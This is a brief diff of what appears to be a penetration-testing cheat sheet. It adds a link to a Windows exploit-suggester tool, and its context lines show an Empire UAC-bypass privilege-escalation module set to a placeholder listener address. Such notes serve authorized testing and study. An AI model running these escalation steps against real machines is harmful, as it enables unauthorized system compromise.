@@ -537,6 +537,9 @@ usemodule privesc/bypassuac_wscript
 set Listener INSERTIPADDRESS
 execute
 
+Exploit Suggester:
+https://github.com/bitsadmin/wesng
+
 ```
 ### Basic info
 
